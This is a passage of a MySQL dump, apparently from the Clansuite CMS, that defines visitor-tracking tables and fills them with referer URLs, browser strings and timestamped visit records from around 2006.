INSERT INTO `cs_pot_hostnames` VALUES (-404511347, 'brasiltelecom.net.br');
INSERT INTO `cs_pot_hostnames` VALUES (26083, 'OB');

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_pot_operating_systems`
-- 

CREATE TABLE `cs_pot_operating_systems` (
  `data_id` int(11) NOT NULL,
  `string` varchar(255) collate latin1_general_ci NOT NULL,
  PRIMARY KEY  (`data_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci DELAY_KEY_WRITE=1;

-- 
-- Daten für Tabelle `cs_pot_operating_systems`
-- 

INSERT INTO `cs_pot_operating_systems` VALUES (-114077417, 'Windows XP');
INSERT INTO `cs_pot_operating_systems` VALUES (2128529172, 'Not identified');

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_pot_referers`
-- 

CREATE TABLE `cs_pot_referers` (
  `data_id` int(11) NOT NULL,
  `string` varchar(255) collate latin1_general_ci NOT NULL,
  PRIMARY KEY  (`data_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci DELAY_KEY_WRITE=1;

-- 
-- Daten für Tabelle `cs_pot_referers`
-- 

INSERT INTO `cs_pot_referers` VALUES (1132472751, 'clansuite.com/');
INSERT INTO `cs_pot_referers` VALUES (-1441976475, 'clansuite.com/index.php?');
INSERT INTO `cs_pot_referers` VALUES (-1023914482, 'clansuite.com/index.php?suiteSID=661c28ed183de5b90e4383c034ff14f4&');
INSERT INTO `cs_pot_referers` VALUES (134826615, 'clansuite.com/index.php');
INSERT INTO `cs_pot_referers` VALUES (-905689769, 'www.clansuite.com/index.php');
INSERT INTO `cs_pot_referers` VALUES (-1065309911, 'clansuite.com/index.php?mod=downloads');
INSERT INTO `cs_pot_referers` VALUES (-102521874, 'clansuite.com/index.php?mod=gb&suiteSID=d57ae46b9af1ad6e406f214c8f5335c9');
INSERT INTO `cs_pot_referers` VALUES (103507867, 'clansuite.com/index.php?mod=login');
INSERT INTO `cs_pot_referers` VALUES (1270890137, 'clansuite.com/index.php?mode=impressum');
INSERT INTO `cs_pot_referers` VALUES (395143073, 'clansuite.com/index.php?mod=schedule');
INSERT INTO `cs_pot_referers` VALUES (1077705306, 'clansuite.com/index.php?mod=gallery');
INSERT INTO `cs_pot_referers` VALUES (1847759360, 'www.clansuite.com/index.php?mode=impressum');
INSERT INTO `cs_pot_referers` VALUES (-135620945, 'clansuite.com/index.php?mod=account&action=register');
INSERT INTO `cs_pot_referers` VALUES (731531047, 'clansuite.com/index.php?mod=account&action=login');
INSERT INTO `cs_pot_referers` VALUES (1540273964, 'clansuite.com/index.php?mod=account&action=register-done');
INSERT INTO `cs_pot_referers` VALUES (-1003281258, 'clansuite.com/index.php?mod=account&action=register&suiteSID=4dfd71827c87d2d37742d2f432b9c607');
INSERT INTO `cs_pot_referers` VALUES (2049004740, 'clansuite.com/index.php?mod=account');
INSERT INTO `cs_pot_referers` VALUES (1220846043, 'www.clansuite.com/index.php?mod=account&action=login');
INSERT INTO `cs_pot_referers` VALUES (-809290527, 'www.clansuite.com/index.php?mod=account&action=register');
INSERT INTO `cs_pot_referers` VALUES (354718797, 'clansuite.com/index.php?mod=account&action=login&suiteSID=59ac3d54cce0af8287bbebb4ef01caaf');
INSERT INTO `cs_pot_referers` VALUES (-1842881660, 'www.clansuite.com/index.php?mod=account');

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_pot_user_agents`
-- 

CREATE TABLE `cs_pot_user_agents` (
  `data_id` int(11) NOT NULL,
  `string` varchar(255) collate latin1_general_ci NOT NULL,
  PRIMARY KEY  (`data_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci DELAY_KEY_WRITE=1;

-- 
-- Daten für Tabelle `cs_pot_user_agents`
-- 

INSERT INTO `cs_pot_user_agents` VALUES (-530574017, 'Firefox/1.5');
INSERT INTO `cs_pot_user_agents` VALUES (2128529172, 'Not identified');
INSERT INTO `cs_pot_user_agents` VALUES (544147846, 'MSIE 6.0');
INSERT INTO `cs_pot_user_agents` VALUES (565011377, 'MSIE 7.0');
INSERT INTO `cs_pot_user_agents` VALUES (2084750625, 'Microsoft-WebDAV-MiniRedir/5.1.2600');
INSERT INTO `cs_pot_user_agents` VALUES (1694105516, 'Mozilla 1.7.12');
INSERT INTO `cs_pot_user_agents` VALUES (404955051, 'Firefox/1.5.0.4');

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_pot_visitors`
-- 

CREATE TABLE `cs_pot_visitors` (
  `accesslog_id` int(11) NOT NULL,
  `visitor_id` int(11) NOT NULL,
  `client_id` int(10) unsigned NOT NULL,
  `operating_system_id` int(11) NOT NULL,
  `user_agent_id` int(11) NOT NULL,
  `host_id` int(11) NOT NULL,
  `referer_id` int(11) NOT NULL,
  `timestamp` int(10) unsigned NOT NULL,
  `weekday` tinyint(1) unsigned NOT NULL,
  `hour` tinyint(2) unsigned NOT NULL,
  `returning_visitor` tinyint(1) unsigned NOT NULL,
  PRIMARY KEY  (`accesslog_id`),
  KEY `client_time` (`client_id`,`timestamp`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci DELAY_KEY_WRITE=1;

-- 
-- Daten für Tabelle `cs_pot_visitors`
-- 

INSERT INTO `cs_pot_visitors` VALUES (-1243081271, -1243081271, 1, -114077417, -530574017, -1631451101, 0, 1150833542, 2, 21, 0);
INSERT INTO `cs_pot_visitors` VALUES (12408568, 12408568, 1, -114077417, -530574017, -1631451101, 1132472751, 1150833555, 2, 21, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1520139800, -1520139800, 1, -114077417, -530574017, -1631451101, 1132472751, 1150833626, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (1928790422, 1928790422, 1, -114077417, -530574017, -1631451101, 1132472751, 1150834009, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1920446340, -1920446340, 1, -114077417, -530574017, -1631451101, 1132472751, 1150834029, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1732572996, -1732572996, 1, -114077417, -530574017, -1631451101, 1132472751, 1150834039, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (162533754, 162533754, 1, -114077417, -530574017, -1631451101, 1132472751, 1150834122, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (1749545857, 1749545857, 1, -114077417, -530574017, -1631451101, -1441976475, 1150834126, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (-874776070, -874776070, 1, -114077417, -530574017, -1631451101, -1441976475, 1150834149, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1950232267, -1950232267, 1, -114077417, -530574017, -1631451101, -1441976475, 1150834153, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (-755034500, -755034500, 1, -114077417, -530574017, -1631451101, -1441976475, 1150834187, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (-501265707, -501265707, 1, -114077417, -530574017, -1631451101, -1441976475, 1150834192, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (-919561434, -919561434, 1, -114077417, -530574017, -1631451101, -1441976475, 1150834197, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1228563005, -1228563005, 1, -114077417, -530574017, -1631451101, -1441976475, 1150834248, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (193828481, 193828481, 1, -114077417, -530574017, -1631451101, -1441976475, 1150834255, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (1184916649, 1184916649, 1, -114077417, -530574017, -1631451101, -1441976475, 1150834262, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (1106751169, 1106751169, 1, -114077417, -530574017, -1631451101, -1441976475, 1150834327, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1781961268, -1781961268, 1, -114077417, -530574017, -1631451101, -1441976475, 1150835652, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (993125742, 993125742, 1, -114077417, -530574017, -1631451101, -1441976475, 1150835657, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1314143067, -1314143067, 1, -114077417, -530574017, -1631451101, -1441976475, 1150836687, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (439515535, 439515535, 1, -114077417, -530574017, -1631451101, -1441976475, 1150836706, 2, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (1473693702, 1473693702, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839005, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1215217233, -1215217233, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839007, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-412944080, -412944080, 1, -114077417, -530574017, -1631451101, 0, 1150839032, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1615518624, -1615518624, 1, -114077417, -530574017, -1631451101, 1132472751, 1150839034, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (1759625543, 1759625543, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839059, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (1287846469, 1287846469, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839060, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (1671020615, 1671020615, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839075, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (1734871132, 1734871132, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839143, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (1620213084, 1620213084, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839144, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-859813260, -859813260, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839145, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1099012849, -1099012849, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839146, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-309439034, -309439034, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839146, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (1033759086, 1033759086, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839147, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-741119799, -741119799, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839154, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1478662616, -1478662616, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839156, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (60582802, 60582802, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839181, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1726310019, -1726310019, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839182, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (1048069177, 1048069177, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839184, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (1809198870, 1809198870, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839249, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (545786925, 545786925, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839252, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (679924181, 679924181, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839292, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (8734048, 8734048, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839294, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1634035189, -1634035189, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839305, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1568145014, -1568145014, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839306, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (230036247, 230036247, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839307, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (236358818, 236358818, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839307, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (2135543803, 2135543803, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839346, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (610223941, 610223941, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839348, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1720006863, -1720006863, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839350, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1987385814, -1987385814, 1, -114077417, -530574017, -1631451101, -1441976475, 1150839728, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1606958556, -1606958556, 1, -114077417, -530574017, -1631451101, -1023914482, 1150840329, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (219713194, 219713194, 1, -114077417, -530574017, -1631451101, -1441976475, 1150840337, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (1260940836, 1260940836, 1, -114077417, -530574017, -1631451101, -1441976475, 1150840347, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (1035387113, 1035387113, 1, -114077417, -530574017, -1631451101, -1441976475, 1150840378, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (1975881501, 1975881501, 1, -114077417, -530574017, -1631451101, -1441976475, 1150840379, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-747130695, -747130695, 1, -114077417, -530574017, -1631451101, 134826615, 1150840381, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-2136786174, -2136786174, 1, -114077417, -530574017, -1631451101, 134826615, 1150840687, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (1368366203, 1368366203, 1, -114077417, -530574017, -1631451101, 134826615, 1150840701, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-617809359, -617809359, 1, -114077417, -530574017, -1631451101, 134826615, 1150840703, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1681801942, -1681801942, 1, -114077417, -530574017, -1631451101, 134826615, 1150840780, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (59317581, 59317581, 1, -114077417, -530574017, -1631451101, 134826615, 1150840782, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-436137533, -436137533, 1, -114077417, -530574017, -1631451101, 134826615, 1150840783, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (1817050296, 1817050296, 1, -114077417, -530574017, -1631451101, 134826615, 1150840812, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1719966527, -1719966527, 1, -114077417, -530574017, -1631451101, 134826615, 1150840813, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (-905368008, -905368008, 1, -114077417, -530574017, -1631451101, 134826615, 1150840910, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1836359025, -1836359025, 1, -114077417, -530574017, -1631451101, 134826615, 1150840913, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1980967833, -1980967833, 1, -114077417, -530574017, -1631451101, -905689769, 1150840914, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (1296476138, 1296476138, 1, -114077417, -530574017, -1631451101, -905689769, 1150840976, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (1620389093, 1620389093, 1, -114077417, -530574017, -1631451101, -905689769, 1150840981, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (-2069915482, -2069915482, 1, -114077417, -530574017, -1631451101, -905689769, 1150841292, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (1235786517, 1235786517, 1, -114077417, -530574017, -1631451101, -905689769, 1150841449, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (109597026, 109597026, 1, -114077417, -530574017, -1631451101, -905689769, 1150841453, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1488876200, -1488876200, 1, -114077417, -530574017, -1631451101, -905689769, 1150841458, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (1475535991, 1475535991, 1, -114077417, -530574017, -1631451101, 0, 1150841461, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (-828911075, -828911075, 1, -114077417, -530574017, -1631451101, 0, 1150841466, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (273364583, 273364583, 1, -114077417, -530574017, -1631451101, 0, 1150841598, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (-206093904, -206093904, 1, -114077417, -530574017, -1631451101, 0, 1150841950, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (169436560, 169436560, 1, -114077417, -530574017, -1631451101, 0, 1150842016, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1252393050, -1252393050, 1, -114077417, -530574017, -1631451101, 0, 1150842028, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (1421765015, 1421765015, 1, -114077417, -530574017, -1631451101, 0, 1150842123, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (-361630694, -361630694, 1, -114077417, -530574017, -1631451101, 0, 1150842214, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (1752161971, 1752161971, 1, 2128529172, 2128529172, 2091469435, 0, 1150842475, 3, 0, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1830723705, -1830723705, 1, -114077417, -530574017, -1631451101, 0, 1150845293, 3, 1, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1130060089, -1130060089, 1, -114077417, -530574017, -1631451101, 0, 1150845444, 3, 1, 0);
INSERT INTO `cs_pot_visitors` VALUES (264517879, 264517879, 1, -114077417, -530574017, -1631451101, 0, 1150845568, 3, 1, 0);
INSERT INTO `cs_pot_visitors` VALUES (-802870882, -802870882, 1, -114077417, -530574017, -1631451101, 1132472751, 1150845579, 3, 1, 0);
INSERT INTO `cs_pot_visitors` VALUES (1934372970, 1934372970, 1, -114077417, -530574017, -1631451101, 0, 1150848791, 3, 2, 0);
INSERT INTO `cs_pot_visitors` VALUES (1040118740, 1040118740, 1, -114077417, -530574017, -1631451101, 0, 1150848793, 3, 2, 0);
INSERT INTO `cs_pot_visitors` VALUES (-745482243, -745482243, 1, -114077417, -530574017, -1631451101, 0, 1150850476, 3, 2, 0);
INSERT INTO `cs_pot_visitors` VALUES (437653954, 437653954, 1, -114077417, -530574017, -1631451101, -1065309911, 1150857381, 3, 4, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1395522779, -1395522779, 1, -114077417, -530574017, -1631451101, -1065309911, 1150857421, 3, 4, 0);
INSERT INTO `cs_pot_visitors` VALUES (786296169, 786296169, 1, -114077417, -530574017, -1631451101, -102521874, 1150859839, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (1492808778, 1492808778, 1, -114077417, -530574017, -1631451101, -102521874, 1150859844, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (1665343570, 1665343570, 1, -114077417, -530574017, -1631451101, -102521874, 1150859849, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (927262794, 927262794, 1, -114077417, -530574017, -1631451101, -102521874, 1150859855, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (1211736208, 1211736208, 1, -114077417, -530574017, -1631451101, -102521874, 1150859875, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (-125526098, -125526098, 1, -114077417, -530574017, -1631451101, -102521874, 1150859878, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (601030263, 601030263, 1, -114077417, -530574017, -1631451101, -102521874, 1150859882, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (-621624809, -621624809, 1, -114077417, -530574017, -1631451101, -102521874, 1150859921, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1188096948, -1188096948, 1, -114077417, -530574017, -1631451101, 0, 1150861119, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (2091685137, 2091685137, 1, -114077417, -530574017, -1631451101, 103507867, 1150861122, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (-997569942, -997569942, 1, -114077417, -530574017, -1631451101, 103507867, 1150861125, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1407189520, -1407189520, 1, -114077417, -530574017, -1631451101, 103507867, 1150861146, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (-556642841, -556642841, 1, -114077417, -530574017, -1631451101, 103507867, 1150861156, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (264228182, 264228182, 1, -114077417, -530574017, -1631451101, 103507867, 1150861162, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (1471223858, 1471223858, 1, -114077417, -530574017, -1631451101, 103507867, 1150861167, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (-2139007969, -2139007969, 1, -114077417, -530574017, -1631451101, 103507867, 1150861213, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (585866094, 585866094, 1, -114077417, -530574017, 0, 103507867, 1150861311, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (1064299594, 1064299594, 1, -114077417, -530574017, 0, 1270890137, 1150861356, 3, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1343008485, -1343008485, 1, -114077417, -530574017, -1631451101, 103507867, 1150863056, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-304208467, -304208467, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863727, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1253256836, 1253256836, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863727, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-122968643, -122968643, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863727, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1000004898, -1000004898, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863728, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (2071970912, 2071970912, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863728, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (2092053855, 2092053855, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863728, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (589304951, 589304951, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863729, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1375920613, -1375920613, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863729, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (412607443, 412607443, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863729, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1376116182, 1376116182, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863730, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1897783115, -1897783115, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863730, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-23022525, -23022525, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863730, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1061965981, -1061965981, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863731, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-504332500, -504332500, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863731, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1973641702, -1973641702, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863731, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-824999684, -824999684, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863732, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-509880572, -509880572, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863732, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1191007782, 1191007782, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863732, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-640254447, -640254447, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863733, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (392611751, 392611751, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863733, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1597997613, 1597997613, 1, -114077417, -530574017, -1631451101, -1065309911, 1150863733, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1918827868, -1918827868, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864074, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (5231201, 5231201, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864075, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (100262669, 100262669, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864075, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1837511215, -1837511215, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864075, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-292230748, -292230748, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864076, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1226424768, 1226424768, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864076, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1284195389, 1284195389, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864076, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-737518808, -737518808, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864077, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (806642551, 806642551, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864077, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (2106034926, 2106034926, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864077, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1694890130, 1694890130, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864078, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-864959897, -864959897, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864078, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-425434127, -425434127, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864078, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-252680118, -252680118, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864078, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1366325263, -1366325263, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864079, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-309244211, -309244211, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864079, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1909065417, 1909065417, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864079, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (17727941, 17727941, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864080, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1988285315, 1988285315, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864080, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1295013625, -1295013625, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864080, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (709396784, 709396784, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864081, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (682257806, 682257806, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864096, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1845433808, -1845433808, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864096, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1903395744, 1903395744, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864097, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1802109659, 1802109659, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864097, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1098896906, 1098896906, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864097, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1364928085, 1364928085, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864098, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (699864734, 699864734, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864098, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (2003997468, 2003997468, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864098, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1381186023, -1381186023, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864099, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1228238072, 1228238072, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864099, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-709412386, -709412386, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864099, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1596595681, 1596595681, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864099, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1588799942, 1588799942, 1, -114077417, -530574017, -1631451101, 1132472751, 1150864100, 3, 6, 0);
